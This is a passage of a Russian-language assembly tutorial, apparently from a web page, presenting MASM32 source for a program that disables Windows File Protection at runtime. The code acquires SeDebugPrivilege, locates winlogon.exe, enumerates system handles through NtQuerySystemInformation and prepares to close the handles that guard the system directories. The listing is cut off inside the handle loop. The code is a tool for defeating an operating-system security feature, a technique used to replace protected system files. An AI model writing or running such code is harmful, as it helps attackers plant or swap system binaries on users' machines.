&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">ecx</span>==<span style="color: #ff0000;">0</span><span style="color: black;">&#41;</span>&amp;&amp;<span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>else<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
CompareStringBackwards endp<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Если строки равны и CompareStringsBackwards возвращает единицу, то мы переоткрываем описатель чтобы открыть его с правами DUPLICATE_CLOSE_SOURCE or DUPLICATE_SAME_ACCESS. Флаг DUPLICATE_CLOSE_SOURCE указывает, что функция DuplicateHandle закрывает указанный описатель в указанном процессе.</p>
<p>А теперь посмотрите полные код программки, которая отключает Windows File Protection во время работы ОС. После перезагрузки WFP опять будет включена.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; П Р О Г Р А М М А&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Отключение Windows File Protection на лету&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Options and Includes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #ff0000;">.386</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
option casemap<span style="color: #339933;">:</span>none &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\user32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\user32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
include \tools\masm32\include\advapi32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
includelib \tools\masm32\lib\advapi32<span style="color: #339933;">.</span>lib &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<br />
Handle_Info struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; Pid <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; ObjectType <span style="color: #0000ff; font-weight: bold;">WORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; HandleValue <span style="color: #0000ff; font-weight: bold;">WORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; ObjectPointer <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; AccessMask <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?&nbsp; &nbsp; &nbsp; <br />
Handle_Info ends<br />
<br />
UNICODE_STRING STRUCT<br />
&nbsp; &nbsp; &nbsp; &nbsp; woLength&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span>&nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; len of string in bytes (not chars)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; MaximumLength &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span>&nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; len of Buffer in bytes (not chars)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; Buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> &nbsp; ? &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; pointer to string</span><br />
UNICODE_STRING ENDS<br />
<br />
System_Handle_Information struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; nHandleEntries <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; pHandleInfo <span style="color: #0000ff; font-weight: bold;">DWORD</span> ? <br />
System_Handle_Information ends<br />
<br />
CharUpperW PROTO <span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
lstrlenW PROTO <span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
<br />
STATUS_INFO_LENGTH_MISMATCH <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #ff0000;">0C0000004h</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Initialized Data Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; Priv <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;SeDebugPrivilege&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ntdll <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;NTDLL.DLL&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; FuncName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;NtQuerySystemInformation&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; FuncName2 <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;NtQueryObject&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; pSystemHandleInfo <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; SizeBuffer <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; winlogon_str <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;winlogon.exe&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; hWinlogon <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WinDir1 <span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #7f007f;">&quot;W&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;I&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;N&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;D&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;O&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;W&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;S&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;\&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;S&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;Y&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;S&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;T&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;E&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;M&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;3&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;2&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WinDir2 <span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #7f007f;">&quot;W&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;I&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;N&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;N&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;T&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;\&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;S&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;Y&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;S&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;T&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;E&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;M&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;3&quot;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;2&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<br />
<br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Uninitialized Data Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span>?&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; _NtQuerySystemInformation <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; _NtQueryObject <span style="color: #0000ff; font-weight: bold;">dd</span> ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; uBuff <span style="color: #0000ff; font-weight: bold;">dd</span> ? <br />
&nbsp; &nbsp; &nbsp; &nbsp; WinLogon_Id <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; hCopy <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
ObjName label <span style="color: #0000ff; font-weight: bold;">byte</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; Name UNICODE_STRING &lt;?&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; pBuffer <span style="color: #0000ff; font-weight: bold;">db</span> MAX_PATH<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<br />
<br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Code Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> EnableDebugPrivilege<span style="color: black; font-style: italic;">;Теперь у нас отладочные привилегии</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset ntdll<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset FuncName<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _NtQuerySystemInformation<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset ntdll<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset FuncName2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _NtQueryObject<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Получаем описатель процесса Winlogon.exe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset winlogon_str<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetPIDbyName<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> WinLogon_Id<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcess<span style="color: #339933;">,</span>PROCESS_DUP_HANDLE<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hWinlogon<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Определям размер буфера для получения списка хэндлов&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset SizeBuffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">16</span><span style="color: black; font-style: italic;">;SystemHandleInformation</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _NtQuerySystemInformation<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=STATUS_INFO_LENGTH_MISMATCH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> end_calc_size<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
next_calc_size<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> SizeBuffer<span style="color: #339933;">,</span><span style="color: #ff0000;">01000h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if pSystemHandleInfo!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualFree<span style="color: #339933;">,</span>pSystemHandleInfo<span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> MEM_RELEASE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualAlloc<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span> SizeBuffer<span style="color: #339933;">,</span> MEM_COMMIT<span style="color: #339933;">,</span> PAGE_READWRITE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> pSystemHandleInfo<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset uBuff<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> SizeBuffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> pSystemHandleInfo<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">16</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _NtQuerySystemInformation<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==STATUS_INFO_LENGTH_MISMATCH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> next_calc_size<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
end_calc_size<span style="color: #339933;">:</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Получаем все хэндлы и закрываем ненужные &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr System_Handle_Information<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pSystemHandleInfo<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>nHandleEntries<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;mov edi,[edi].pHandleInfo</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr Handle_Info<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
next_handle<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Pid<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==WinLogon_Id<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
